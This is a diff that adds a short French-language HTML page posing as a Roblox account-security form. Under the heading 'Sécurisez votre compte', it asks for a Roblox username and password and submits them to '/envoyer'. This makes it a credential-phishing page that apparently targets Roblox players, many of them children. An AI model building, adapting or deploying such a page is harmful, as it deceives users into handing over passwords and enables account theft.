@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Zone de Messages</title>
+    <style>
+        body { font-family: sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; background-color: #f9f9f9; }
+        .form-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input, textarea, button { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; border-radius: 4px; border: 1px solid #ccc; }
+        button { background-color: #007BFF; color: black; border: none; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <h2>Sécurisez votre compte</h2>
+        <form action="/envoyer" method="POST">
+            <label for="NOM D'UTILISATEUR">Nom d'utilisateur ROBLOX :</label>
+            <input type="text" id="pseudo" name="pseudo" placeholder="nom d'utilisateur" required>
+
+            <label for="message">Votre mots de passe roblox  :</label>
+            <textarea id="message" name="message" placeholder="Mots de pass" required></textarea>
+
+            <button type="Envoyer">sécurisation de votre compte</button>
+        </form>
+    </div>
+
+</body>
+</html>
+
